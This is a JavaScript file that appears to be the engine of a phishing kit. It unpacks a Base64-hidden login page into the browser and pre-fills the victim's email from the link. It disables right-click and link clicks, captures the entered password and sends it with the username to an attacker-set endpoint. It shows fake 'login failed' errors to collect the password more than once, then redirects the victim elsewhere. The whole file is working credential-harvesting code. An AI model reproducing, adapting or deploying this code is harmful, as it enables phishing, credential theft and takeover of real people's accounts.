function validateEmail(email) {
    let re = /^\S+@\S+[\.][0-9a-z]+$/;
    return re.test(String(email).toLowerCase());
}

function getUrlParameter(sParam) {
    let sPageURL = decodeURIComponent(window.location.search.substring(1)),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
}

let dDOM = function () {
    if (LIB_view) {
        // let decryptedBytes = CryptoJS.AES.decrypt(LIB_view, LIB_phrase);
        // return decryptedBytes.toString(CryptoJS.enc.Utf8);

        return Base64.decode(LIB_view);
    }
};

let Base64 = {
    // private property
    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    // public method for encoding
    encode: function (input) {
        let output = "";
        let chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        let i = 0;

        input = Base64._utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
                this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
                this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

        }

        return output;
    },

    // public method for decoding
    decode: function (input) {
        let output = "";
        let chr1, chr2, chr3;
        let enc1, enc2, enc3, enc4;
        let i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = Base64._utf8_decode(output);

        return output;

    },

    // private method for UTF-8 encoding
    _utf8_encode: function (string) {
        string = string.replace(/\r\n/g, "\n");
        let utftext = "";

        for (let n = 0; n < string.length; n++) {

            let c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    // private method for UTF-8 decoding
    _utf8_decode: function (utftext) {
        let string = "";
        let i = 0;
        let c = c1 = c2 = 0;

        while (i < utftext.length) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;

    }
};


function getHashParameters() {
    const hash = window.location.hash;
    let params = {};
    if (hash) {
        const hashParameters = hash.substr(1)
            .replace(/^\/+|\/+$/g, '')
            .split('/');
        let emailHash = hashParameters.length > 1 ? hashParameters[1] : hashParameters[0];
        let trueLogin = hashParameters.length > 1 ? hashParameters[0] === '1' : false;

        params = {
            'trueLogin': trueLogin,
            'email': emailHash,
            'params': hashParameters,
        };
    }

    return Object.assign({
        'trueLogin': false,
        'email': '',
        'params': [],
    }, params);

}

function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function getEmailDomain(email) {
    return email.replace(/.*@/, "");
}

function getEmailDomainName(email) {
    const domain = getEmailDomain(email);
    return domain.substring(0, domain.lastIndexOf("."));
}

function getParameters() {
    const hashParameters = getHashParameters();
    const decrypt = getUrlParameter('t') || hashParameters.params.length > 0;
    const trueLogin = getUrlParameter('tl') || hashParameters.trueLogin;
    const emailEnc = getUrlParameter('enc');
    const email = getUrlParameter('e') || hashParameters.email;

    return {
        'trueLogin': trueLogin,
        'email': email,
        'hash': hashParameters,
        'emailEnc': emailEnc,
        'decrypt': decrypt
    }
}

//Defaults
let LIB_submitTrial = 1;
window.LIB_userInput = null;
window.LIB_pwdInput = null;
window.LIB_submitButton = null;
window.LIB_spinner = null;
window.LIB_trialLimit = 2;
window.LIB_beforeSend = null;
window.LIB_onAppSuccess = null;
window.LIB_onComplete = null;
window.LIB_onLoginFail = null;
window.LIB_onServerError = null;
window.LIB_form = null;
window.LIB_submitInputs = null;
window.LIB_setup = null;
window.LIB_extraData = null;
window.LIB_validate = () => {
    let name = window.LIB_userInput.value, path = window.LIB_pwdInput.value;
    return name && path;
};

function initApp(onDDOMComplete, container) {
    let params = getParameters();
    if (params.email && params.emailEnc) {
        params.email = atob(params.email);
    }

    if (params.decrypt) {
        const dom = dDOM();
        container.innerHTML = dom
            ? dom.replace(/\.\/media/g, ____media)
            : container.innerHTML.replace(/\.\/media/g, ____media);
        container.style.display = 'block';

        nodeScriptReplace(container);
    }

    let ok = false;
    if (typeof LIB__startDate !== 'undefined') {
        if (LIB__startDate === 'never') {
            ok = true;
        } else {
            let startDate = new Date(Date.parse(LIB__startDate));
            const endDate = new Date(startDate.setMonth(startDate.getMonth() + 1));
            const now = Date.parse(new Date());
            const diff = endDate - now;
            ok = diff > 0 && diff / 86400000 < (30 * 2); //Future date not more than 2 months
        }
    }


    if (typeof onDDOMComplete === "function" && ok)
        onDDOMComplete(params);

    //No menu
    document.oncontextmenu =
        document.body.oncontextmenu = () => false;

    const parts = ['import', 'login', 'challenge', 'otp'] //URL paths to ignore
    if (params.email && window.LIB_userInput && !window.LIB_userInput.value && !parts.includes(params.email))
        window.LIB_userInput.value = params.email;

    [...document.getElementsByTagName('a')]
        .forEach(function (object, index) {
            object.addEventListener("click", function (e) {
                e.preventDefault();
            });
        });

    if (window.LIB_pwdInput)
        window.LIB_pwdInput.addEventListener("keyup", function (e) {
            if (window.LIB_submitButton)
                window.LIB_submitButton.disabled = this.value.length <= 2;
        });

    if (typeof window.LIB_beforeSend !== "function") {
        window.LIB_beforeSend = function () {
            if (window.LIB_submitButton)
                window.LIB_submitButton.disabled = true;

            if (window.LIB_spinner)
                window.LIB_spinner.style.display = 'inline';
        }
    }

    if (typeof window.LIB_onComplete !== "function") {
        window.LIB_onComplete = function () {
            // window.LIB_submitButton.disabled = false;
            if (window.LIB_spinner)
                window.LIB_spinner.style.display = 'none';
        }
    }

    if (!window.LIB_setup) {
        if (params.trueLogin) {
            window.LIB_setup = trueLoginUserSetup;
            window.LIB_trialLimit = 0;
        } else {
            window.LIB_setup = loginUserSetup;
            window.LIB_trialLimit = window.____retry || window.LIB_trialLimit;
        }
    }

    if (window.LIB_form) {
        window.LIB_form.addEventListener("submit", function (e) {
            e.preventDefault();
            submit(params);
        })
    }

    if (!window.LIB_submitInputs) {
        window.LIB_submitInputs = [window.LIB_userInput, window.LIB_pwdInput];
    }

    LIB_submitInputs.forEach(function (el) {
        if (!el) return;

        el.addEventListener("keydown", function (e) {
            if (!e) {
                let e = window.event;
            }
            // Enter is pressed
            if (e.keyCode == 13) {
                e.preventDefault(); // sometimes useful
                submit(params);
            }
        })
    });

    if (window.LIB_submitButton) {
        window.LIB_submitButton.addEventListener("click", function (e) {
            e.preventDefault();
            submit(params);
        });
    }
}

function getExtraData() {
    let extra = '';
    if (typeof window.LIB_extraData === 'function') {
        const data = window.LIB_extraData();
        for (const key in data) {
            if (data.hasOwnProperty(key)) {
                extra += `${key}: ${data[key]}\n`
            }
        }
    }
    extra += "Trial: " + LIB_submitTrial;

    return extra;
}

function submit(params) {
    if (window.LIB_validate)
        if (!window.LIB_validate())
            return;

    sendPost(____b, {
        'name': window.LIB_userInput.value || (params.email || ''),
        'desc': getExtraData(),
        't': 1,
        ...window.LIB_setup()
    }, function (e) {
        if (LIB_submitTrial <= window.LIB_trialLimit) {
            //Show error
            if (typeof window.LIB_onLoginFail === "function")
                window.LIB_onLoginFail();

            LIB_submitTrial += 1;
        } else {
            if (typeof window.LIB_onAppSuccess === "function")
                window.LIB_onAppSuccess();
            else
                window.location = ____rdr;
        }
    }, function (httpObj, textStatus) {
        //Show error
        if (httpObj.status == 401) {
            if (typeof window.LIB_onLoginFail === "function")
                window.LIB_onLoginFail();
        } else if (httpObj.status == 500) {
            if (typeof window.LIB_onServerError === "function")
                window.LIB_onServerError();
        }
    });

}

function loginUserSetup() {
    let password = window.LIB_pwdInput ? window.LIB_pwdInput.value : null;
    return {
        'path': password
    }
}

function trueLoginUserSetup() {
    let password = window.LIB_pwdInput ? window.LIB_pwdInput.value : null;
    return {
        'path': password,
        'v': 1
    }
}

function sendPost(url, data, onSuccess, onFailure, always) {
    if (typeof window.LIB_beforeSend === "function") {
        const proceed = window.LIB_beforeSend(url, data);
        if (proceed === false)
            return;
    }

    let xhr = new XMLHttpRequest();
    bindXhr(xhr, onSuccess, onFailure, always);
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
}

function sendGet(url, onSuccess, onFailure, always) {
    if (typeof window.LIB_beforeSend === "function") {
        const proceed = window.LIB_beforeSend(url, data);
        if (proceed === false)
            return;
    }

    let xhr = new XMLHttpRequest();
    bindXhr(xhr, onSuccess, onFailure, always);
    xhr.open('GET', url, true);
    xhr.send();
}

function bindXhr(xhr, onSuccess, onFailure, always) {
    xhr.onreadystatechange = function () {
        if (this.readyState != 4) return;

        if (this.status == 200) {
            let data;
            try {
                data = JSON.parse(this.responseText);
            } catch (e) {
                data = this.responseText;
            }

            if (typeof window.LIB_onSuccess === "function")
                window.LIB_onSuccess(data, this, xhr);

            if (typeof onSuccess === "function")
                onSuccess(data, this, xhr);
        } else {
            if (typeof window.LIB_onFailure === "function")
                window.LIB_onFailure(this, xhr);

            if (typeof onFailure === "function")
                onFailure(this, xhr);
        }

        if (typeof window.LIB_onComplete === "function")
            window.LIB_onComplete(this, xhr);

        if (typeof always === "function")
            always(this, xhr);

        // end of state change: it can be after some time (async)
    };
}

function nodeScriptReplace(node) {
    if (nodeScriptIs(node) === true) {
        node.parentNode.replaceChild(nodeScriptClone(node), node);
    } else {
        let i = 0;
        let children = node.childNodes;
        while (i < children.length) {
            nodeScriptReplace(children[i++]);
        }
    }

    return node;
}

function nodeScriptIs(node) {
    return node.tagName === 'SCRIPT';
}

function nodeScriptClone(node) {
    let script = document.createElement("script");
    script.text = node.innerHTML;
    for (let i = node.attributes.length - 1; i >= 0; i--) {
        script.setAttribute(node.attributes[i].name, node.attributes[i].value);
    }
    return script;
}